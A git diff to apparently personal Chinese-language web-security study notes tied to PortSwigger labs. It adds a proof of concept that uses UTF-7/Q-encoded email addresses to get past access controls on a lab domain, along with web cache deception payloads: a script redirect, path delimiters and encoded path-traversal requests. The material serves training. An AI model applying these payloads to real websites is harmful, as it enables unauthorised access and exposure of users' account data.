@@ -207,6 +207,35 @@ X-Forwarded-Host: <original-host>
 ```bash
 xxxxxxxxxadministrator:your-timestamp
 ```
+### PoC
+
+<span style="font-size: 19px;">**利用电子邮件地址解析差异绕过访问控制**</span>
+
+[Bypassing access controls using email address parsing discrepancies](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-bypassing-access-controls-using-email-address-parsing-discrepancies)
+
+`abcfoo@ginandjuice.shop` ⬇️
+
+*Quoted-Printable（Q 编码）*
+```txt
+# 字符集 ISO-8859-1
+=?iso-8859-1?q?=61=62=63?=foo@ginandjuice.shop
+# 字符集 UTF-8
+=?utf-8?q?=61=62=63?=foo@ginandjuice.shop
+# 字符集 UTF-7
+=?utf-7?q?&AGEAYgBj-?=foo@ginandjuice.shop
+```
+`attacker@[YOUR-EXPLOIT-SERVER_ID] @ginandjuice.shop`⬇️
+```html
+=?utf-7?q?attacker&AEA-[YOUR-EXPLOIT-SERVER_ID]&ACA-?=@ginandjuice.shop
+```
+在 **UTF-7 编码规范（RFC 2152）** 中：
+* `&` 是 UTF-7 字符转义的开始标记，`-` 是结束标记，中间是 **Modified Base64 编码**的 Unicode (UTF-16) 字符。
+- **`&AEA-`** 代表 **`@` 符号** (Unicode `U+0040`)
+   * Base64 `AEA` $\rightarrow$ 二进制 `00000000 01000000` $\rightarrow$ 十六进制 `0x0040` $\rightarrow$ **`@`**
+- **`&ACA-`** 代表 **空格 ` `** (Unicode `U+0020`)
+   * Base64 `ACA` $\rightarrow$ 二进制 `00000000 00100000` $\rightarrow$ 十六进制 `0x0020` $\rightarrow$ **` `（Space）**
+
+---
 
 ## Information disclosure
 
@@ -217,7 +246,7 @@ xxxxxxxxxadministrator:your-timestamp
 HTTP `TRACE` 是一种 HTTP 请求方法，用于让服务器**回显它收到的请求内容**，主要用于调试、诊断请求在客户端到服务器之间是否被代理、网关或中间设备修改。
 
 - `TRACE` 的作用不是获取资源或提交数据，而是让服务器把接收到的请求原样返回，以便定位网络或协议层问题
-- [伪造客户端IP地址](#burpsuit)
+- [伪造客户端IP地址](./websecurity.md#burpsuit)
 
 ### version control history
 
@@ -487,3 +516,37 @@ Content-Type: application/xml;charset=UTF-8
 ## Web cache deception
 
 [Web cache deception](https://portswigger.net/web-security/web-cache-deception) is a vulnerability that enables an attacker to trick a web cache into storing sensitive, dynamic content. It's caused by discrepancies between how the cache server and origin server handle requests.
+
+[Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list)
+
+*重定向*
+```javascript
+<script>document.location="https://vulnerable-website.com/my-account/any.js"</script>
+```
+
+<span style="font-size: 19px;">**Exploiting static extension cache rules**</span>
+
+```html
+/my-account/abc
+/my-account/abc.js
+/my-account;ace.js
+```
+<span style="font-size: 19px;">**Exploiting static directory cache rules**</span>
+
+*源服务器规范化*
+```html
+/aaa/..%2fmy-account
+/resources/..%2fmy-account
+/resources/..%2fmy-account?wcd
+```
+*缓存服务器规范化*
+```html
+/<dynamic-path>%2f%2e%2e%2f<static-directory-prefix>
+/my-account?%2f%2e%2e%2fresources
+```
+<span style="font-size: 19px;">**Exploiting file name cache rules**</span>
+
+`robots.txt`, `index.html`, and `favicon.ico`
+```html
+/my-account;%2f%2e%2e%2frobots.txt
+```
